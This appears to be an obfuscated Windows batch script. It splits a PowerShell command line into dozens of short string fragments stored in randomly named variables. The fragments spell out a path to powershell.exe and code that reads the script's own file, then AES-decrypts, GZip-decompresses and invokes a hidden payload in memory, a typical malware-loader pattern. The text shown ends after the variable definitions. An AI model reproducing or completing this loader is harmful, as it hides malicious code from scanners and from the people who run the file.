@echo off
set "YOUvzKaVEV=Po"
set "qBrhHBrspJ=py"
set "KflNRzqVKv=s\"
set "lUwszNRlgC=:\"
set "fZPbShvEzg=we"
set "pULimiBabF=he"
set "oquczrJnYe=rs"
set "MJhDVaQCHN=.e"
set "FCazpiQeJa=st"
set "JlmJkDNlFl=in"
set "HDqvphfMyJ=\W"
set "mJRdKveZIU=ow"
set "hTjStKhNtp=xe"
set "wxaDoliQfW=we"
set "NlGbFCMRqg=1."
set "vEViaJsNHx=ll"
set "kFpPEdBsei=em"
set "jNgWImiolH=nd"
set "yyNDmdcBlZ=\v"
set "sbFfIbiLji=ll"
set "WmEPykJGOl=32"
set "YWGBrgnogI=y "
set "SHitwpEXKo=Wi"
set "PvRbICFzWO=he"
set "LwvVvmvqBV=co"
set "icakoyOAJm=Sy"
set "qkFgeQgiWi=po"
set "yjpxtGoTAw=ws"
set "JhOzEioHJj=0\"
set "hyogKNZLzx= C"
set "kUMskzWOpD=rS"
set "BWIKKJvmcP= /"
set "XwvAqsXkaf=do"
set "YJPxMzuKXm=cd"
set "fNDvIZbZhG= %~dp0"
set "LYkJlFlkfY=);$g"
set "EqzuTnpFTQ=urit"
set "RaUwZkowcP=yste"
set "lytiqgHpfo=pose"
set "dMygKDHqOs=New-"
set "nYkmexQvqK=RmAx"
set "QQjSLKQQPY=yUeW"
set "sfSkIsZoNZ=l5E7"
set "luricXmPvX=A.Pa"
set "UalkdSErjc=iDTA"
set "bYqTFkjkFh=t Sy"
set "LzYizTvIEK=New-"
set "wXneNIzyAH=CO.T"
set "VGMcSRYWii=Invo"
set "wKttTpufhw=pres"
set "muCeVFCXTi=.Mem"
set "CDBxpSfpDU=AsR."
set "uqMlTOAgom=m(, "
set "vdukiRIIwz=R.Su"
set "IysWewOzld=).Sp"
set "AQxYZHZtuV=();$"
set "FavHUbYBcD=.Cry"
set "haLQQMsLKb=y.Ci"
set "jrjQJOWbxF=raph"
set "PzwdBmPClf= [st"
set "lEUyujkfmS=tion"
set "TiosfcAFqz= = $"
set "MCQwiQNejo=3); "
set "CdPhCzRprv=tryP"
set "OzXjajhlpl=('Tg"
set "JMfQMuxpzC=se()"
set "nGYccoGmBw=File"
set "VBIiSzuEqw=ion."
set "WoumjGikOA=TllA"
set "RQzmOJWvxa=ress"
set "QRCUOxaSiB=d;$g"
set "nYrRzHDbxV=$nYJ"
set "VNCyQPoPdA= [Sy"
set "QdIRSPiXpf=yste"
set "eZrjLDsdJD=am;$"
set "MAIubskLNk=ptor"
set "XevAHjAIYb=g) {"
set "teoOZnPmFR=.Dis"
set "SQdxPNeLhd=YJoN"
set "sEQdOVmeBk=.Sec"
set "XucetvqXbt=eMVs"
set "iVwKywicBd=::('"
set "LHnpAoSDzA=..-1"
set "UNkWdnDtXT=S46e"
set "YplhQWxjVy=Stre"
set "dFyluLLMMu=onve"
set "RhGMorkfwp=.Len"
set "MQJZolkIgJ=NyUe"
set "OBRcXonujN=-joi"
set "krfLRGPQis=ress"
set "DYhqBbcoOc=comp"
set "BlNEzvfgLu=('%~f0'"
set "FAhWlFMJEW=Bmor"
set "gFoJSZrolM=lit("
set "QVHgWiUzYl=.Key"
set "vHZkXkDfCg= = $"
set "rZNvDAyDHz=rity"
set "xECtNLeZuj=; };"
set "BfQASjhyKw=Secu"
set "TXIEbWWeMA=ment"
set "TSOpqXHTvN=join"
set "HzATmdiLsC=ecry"
